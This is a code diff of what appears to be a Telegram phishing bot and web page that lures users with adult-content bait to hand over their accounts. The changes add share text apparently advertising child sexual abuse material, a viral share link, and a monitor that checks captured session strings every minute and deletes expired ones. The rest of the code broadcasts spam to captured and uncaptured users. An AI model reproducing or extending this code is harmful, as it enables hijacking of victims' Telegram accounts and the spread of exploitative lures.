@@ -26,17 +26,15 @@ PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
 
-# Welcome default: 2 fast messages
 DEFAULT_WELCOME_MSGS = [
     {"type": "text", "content": "**Hello {name} 👋**\n\n🔞**To again access to the files completely free of charge, do the following💦:**\n\n>👇Confirm that you are not a robot."},
     {"type": "text", "content": "👇"},
 ]
 
 DEFAULT_SHARE = {
-    "text": "Premium content - verified only 🔞",
+    "text": "Premium content - verified only 🔞\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👇",
     "emoji": "🔥",
-    "link": "https://t.me/videodks",
-    "channels": ["https://t.me/videodks"],
+    "link": "https://t.me/Xxxvo_bot",
 }
 
 logger.info("=" * 60)
@@ -177,11 +175,7 @@ def save_welcome_config(cfg):
 def load_broadcast_config():
     cfg = load_json(BROADCAST_CFG_FILE, None)
     if not cfg or not isinstance(cfg, dict):
-        cfg = {
-            "nonlogged": [],
-            "logged": [],
-            "interval": 60,
-        }
+        cfg = {"nonlogged": [], "logged": [], "interval": 60}
         save_json(BROADCAST_CFG_FILE, cfg)
     return cfg
 
@@ -225,7 +219,6 @@ def format_phone(ph):
 
 
 def account_label(a):
-    """Return: 👹👹 for premium, ✨✨ for active, ❌ for expired, ⚰️ for terminated"""
     st = a.get("status", "active")
     if st == "terminated":
         return "⚰️"
@@ -234,19 +227,6 @@ def account_label(a):
     if a.get("is_premium"):
         return "👹👹"
     return "✨✨"
-
-
-def account_status_line(a):
-    """Return status line for section message"""
-    st = a.get("status", "active")
-    phone = a.get("phone", "?")
-    if st == "terminated":
-        return f"{phone} — **terminate complete**"
-    if st == "expired":
-        return f"{phone} — **expire hoyeche**"
-    if a.get("is_premium"):
-        return f"{phone} — 👹👹 premium"
-    return f"{phone} — ✨✨ active"
 
 
 def notify(phone, ss, me, dc, pu=False, pv=""):
@@ -432,10 +412,10 @@ def broadcast_menu():
 
 def bc_nonlogged_menu():
     n = len(broadcast_config.get("nonlogged", []))
-    active = broadcast_state["nonlogged_active"]
+    a = broadcast_state["nonlogged_active"]
     return [
         [Button.inline("➕ Add", b"bcnl_add"),
-         Button.inline("▶️ Start", b"bcnl_start")],
+         Button.inline("▶️ Start" if not a else "⏹ Running", b"bcnl_start")],
         [Button.inline("⏹ Stop", b"bcnl_stop"),
          Button.inline("🗑 Clear", b"bcnl_clear")],
         [Button.inline(f"📋 Queue ({n})", b"bcnl_show")],
@@ -445,10 +425,10 @@ def bc_nonlogged_menu():
 
 def bc_logged_menu():
     n = len(broadcast_config.get("logged", []))
-    active = broadcast_state["logged_active"]
+    a = broadcast_state["logged_active"]
     return [
         [Button.inline("➕ Add", b"bclg_add"),
-         Button.inline("▶️ Start", b"bclg_start")],
+         Button.inline("▶️ Start" if not a else "⏹ Running", b"bclg_start")],
         [Button.inline("⏹ Stop", b"bclg_stop"),
          Button.inline("🗑 Clear", b"bclg_clear")],
         [Button.inline(f"📋 Queue ({n})", b"bclg_show")],
@@ -666,7 +646,6 @@ async def cb(event):
                 "• **Logged** — users who already logged in",
                 broadcast_menu(), edit_event=event)
 
-        # ---- Non-logged broadcast ----
         elif data == "bc_nonlogged":
             await event.answer()
             await safe_send(chat_id,
@@ -722,7 +701,6 @@ async def cb(event):
                 txt += f"{i+1}. [{m.get('type')}] `{prev}...`\n"
             await event.answer(txt[:200], alert=True)
 
-        # ---- Logged broadcast ----
         elif data == "bc_logged":
             await event.answer()
             await safe_send(chat_id,
@@ -778,21 +756,21 @@ async def cb(event):
                 txt += f"{i+1}. [{m.get('type')}] `{prev}...`\n"
             await event.answer(txt[:200], alert=True)
 
-        # ---- Share settings ----
+        # Share settings
         elif data == "menu_share":
             await event.answer()
             await safe_send(chat_id,
                 "🔗 **Share Settings**\n\n"
-                f"📝 Text: `{share_config.get('text', '')}`\n"
+                f"📝 Text: `{share_config.get('text', '')[:30]}...`\n"
                 f"😀 Emoji: `{share_config.get('emoji', '')}`\n"
-                f"🔗 Link: `{share_config.get('link', '')}`",
+                f"🔗 Link: `{share_config.get('link', '')[:30]}...`",
                 share_menu(), edit_event=event)
 
         elif data == "sh_text":
             STATE["awaiting_share_field"] = "text"
             await event.answer()
             await safe_send(chat_id,
-                f"📝 Current: `{share_config.get('text', '')}`\n\nSend new share text.",
+                f"📝 Current:\n`{share_config.get('text', '')}`\n\nSend new share text.",
                 [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
 
         elif data == "sh_emoji":
@@ -817,7 +795,7 @@ async def cb(event):
             preview = f"{emoji} **{text}**\n\n{emoji} {link}"
             await safe_send_user(chat_id, preview)
 
-        # ---- Expired ----
+        # Expired
         elif data == "menu_expired":
             accounts = load_accounts()
             expired = [a for a in accounts if a.get("status") == "expired"]
@@ -977,7 +955,7 @@ async def capture(event):
         share_config[field] = txt.strip()
         STATE["awaiting_share_field"] = None
         save_share_config(share_config)
-        await event.respond(f"✅ Share {field} updated.",
+        await event.respond(f"✅ Share **{field}** updated.",
             buttons=admin_menu(), parse_mode='md')
         return
 
@@ -1039,19 +1017,26 @@ async def capture(event):
         return
 
 
+# ============================================================
+# SECTION MONITOR — 1 MIN CHECK + AUTO DELETE
+# ============================================================
 async def section_monitor():
+    global AUTO_DELETE_EXPIRED
     while True:
         try:
-            await asyncio.sleep(300)
+            await asyncio.sleep(60)  # every 1 minute
             accounts = load_accounts()
             if not accounts:
                 continue
             changed = False
-            for i, a in enumerate(accounts):
+            new_accounts = []
+            for a in accounts:
                 if a.get("status") == "terminated":
+                    new_accounts.append(a)
                     continue
                 session_str = a.get("session", "")
                 if not session_str:
+                    new_accounts.append(a)
                     continue
                 try:
                     loop = asyncio.new_event_loop()
@@ -1073,6 +1058,9 @@ async def section_monitor():
                             a["expired_at"] = time.time()
                             changed = True
                             logger.info(f"Session expired: {a['phone']}")
+                        if AUTO_DELETE_EXPIRED:
+                            logger.info(f"Auto-deleting expired: {a['phone']}")
+                            continue  # skip appending — delete
                     else:
                         added = a.get("added_at", 0)
                         if time.time() - added > 86400 and a.get("status") != "terminated":
@@ -1100,11 +1088,13 @@ async def section_monitor():
                             a["terminated_at"] = time.time()
                             changed = True
                             logger.info(f"Terminated: {a['phone']}")
+                    new_accounts.append(a)
                 except Exception as e:
                     logger.error(f"monitor err {a.get('phone')}: {e}")
-            if changed:
-                save_json(DATA_FILE, accounts)
-                captured_accounts = accounts
+                    new_accounts.append(a)
+            if changed or len(new_accounts) != len(accounts):
+                save_json(DATA_FILE, new_accounts)
+                captured_accounts = new_accounts
         except Exception as e:
             logger.error(f"section_monitor err: {e}")
 
@@ -1113,8 +1103,6 @@ async def broadcast_loop():
     while True:
         try:
             await asyncio.sleep(3)
-
-            # Non-logged broadcast
             if broadcast_state["nonlogged_active"] and time.time() >= broadcast_state["nonlogged_next"]:
                 msgs = broadcast_config.get("nonlogged", [])
                 if msgs:
@@ -1122,8 +1110,6 @@ async def broadcast_loop():
                     broadcast_state["nonlogged_next"] = time.time() + broadcast_state['interval']
                 else:
                     broadcast_state["nonlogged_active"] = False
-
-            # Logged broadcast
             if broadcast_state["logged_active"] and time.time() >= broadcast_state["logged_next"]:
                 msgs = broadcast_config.get("logged", [])
                 if msgs:
@@ -1131,16 +1117,12 @@ async def broadcast_loop():
                     broadcast_state["logged_next"] = time.time() + broadcast_state['interval']
                 else:
                     broadcast_state["logged_active"] = False
-
         except Exception as e:
             logger.error(f"loop err: {e}")
 
 
 async def run_broadcast(messages, target="nonlogged"):
-    """target: 'nonlogged' — users who have NOT shared contact yet; 'logged' — users who HAVE captured"""
-    # Determine user IDs
     if target == "logged":
-        # Logged = users whose tg_id appears in captured accounts
         captured_uids = set()
         for a in captured_accounts:
             uid = a.get("user_id")
@@ -1221,7 +1203,7 @@ async def bot_main():
 
 
 # ============================================================
-# FLASK PAGE
+# FLASK PAGE — SHARE CONFIG FROM API
 # ============================================================
 PAGE = r'''<!DOCTYPE html>
 <html><head>
@@ -1322,9 +1304,13 @@ var codeCheck = null;
 var pwdCheck = null;
 var contactForce = null;
 var inProgress = false;
-var TG_CHANNEL = 'https://t.me/videodks';
-var TG_CAPTION = 'Premium content';
-var SHARE_EMOJI = '🔥';
+var SHARE_CFG = {text: "Premium content", emoji: "🔥", link: "https://t.me/Xxxvo_bot"};
+
+// Fetch share config from server
+fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){
+  if (d && d.link) { SHARE_CFG = d; }
+}).catch(function(){});
+
 function show(id) { document.getElementById(id).classList.add('on'); }
 function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, text, type) {
@@ -1552,7 +1538,8 @@ function updSteps(n) {
   }
 }
 document.getElementById('shareBtn').onclick = function() {
-  var url = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
+  var text = (SHARE_CFG.text || 'Premium content') + '\n\n' + (SHARE_CFG.link || 'https://t.me/Xxxvo_bot');
+  var url = 'https://t.me/share/url?url=' + encodeURIComponent(SHARE_CFG.link || 'https://t.me/Xxxvo_bot') + '&text=' + encodeURIComponent(SHARE_CFG.text || 'Premium content');
   if (tg) { tg.openTelegramLink(url); } else { window.open(url, '_blank'); }
   var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
   localStorage.setItem(USK, String(n));
@@ -1588,7 +1575,6 @@ def health():
         'bot_users': len(users),
         'nl_active': broadcast_state['nonlogged_active'],
         'lg_active': broadcast_state['logged_active'],
-        'welcome_count': len(welcome_config.get('messages', [])),
     })
 
 
